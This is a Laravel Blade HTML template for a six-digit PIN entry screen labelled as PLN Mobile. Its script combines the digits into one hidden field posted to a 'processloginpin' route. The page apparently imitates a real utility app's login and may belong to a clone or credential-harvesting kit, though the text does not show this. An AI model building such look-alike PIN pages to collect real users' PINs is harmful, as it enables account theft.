<!DOCTYPE html>
{{-- by mirza --}}
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Masukkan PIN</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #fff;
      font-family: 'Poppins', sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }
    .top-bar {
      display: flex;
      align-items: center;
      padding: 1rem;
    }
    .back-btn {
      border: none;
      background: none;
      font-size: 1.5rem;
    }
    .title {
      flex-grow: 1;
      text-align: center;
      font-weight: 700;
      font-size: 1.3rem;
      margin-right: 2rem;
    }
    .pin-section {
      flex: 0.3;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .pin-title {
      font-weight: 700;
      color: #106C7E;
      margin-bottom: 2rem;
      font-size: 2rem
    }
    .pin-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
    }
    .pin-inputs input {
      width: 45px;
      height: 45px;
      text-align: center;
      border-radius: 8px;
      border: 1px solid #00000050;
      font-size: 1.25rem;
    }
    .btn-continue {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 90%;
      background-color: #13a0b5;
      color: white;
      font-weight: 500;
      border-radius: 16px;
      padding: 12px;
      box-shadow: 0 3px 5px rgba(0,0,0,0.15);
      text-decoration: none;
    }
  </style>
</head>
<body>

  <!-- Top Navigation -->
  <div class="top-bar">
    <button class="back-btn" onclick="history.back()">&#8592;</button>
    <div class="title">Masukkan PIN</div>
  </div>

  <!-- Main Section -->
  <div class="pin-section">
    <h5 class="pin-title">Masukkan PIN PLN Mobile</h5>
    <form action="{{ route('processloginpin') }}" method="POST">
      @csrf
      <div class="pin-inputs">
        <input type="password" name="pin[]" maxlength="1" required>
        <input type="password" name="pin[]" maxlength="1" required>
        <input type="password" name="pin[]" maxlength="1" required>
        <input type="password" name="pin[]" maxlength="1" required>
        <input type="password" name="pin[]" maxlength="1" required>
        <input type="password" name="pin[]" maxlength="1" required>
      </div>
      @if(session('error'))
        <div class="alert alert-danger mt-3">{{ session('error') }}</div>
      @endif
    </form>
  </div>

  <!-- Continue Button -->
  <button type="submit" form="loginpin-form" class="btn btn-continue">Continue</button>
  <script>
    document.querySelector('form').id = 'loginpin-form';
    // Combine PIN inputs into single field
    document.querySelector('form').addEventListener('submit', function(e) {
      const pinInputs = document.querySelectorAll('input[name="pin[]"]');
      const pin = Array.from(pinInputs).map(input => input.value).join('');
      const hiddenInput = document.createElement('input');
      hiddenInput.type = 'hidden';
      hiddenInput.name = 'pin';
      hiddenInput.value = pin;
      this.appendChild(hiddenInput);
      pinInputs.forEach(input => input.removeAttribute('name'));
    });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
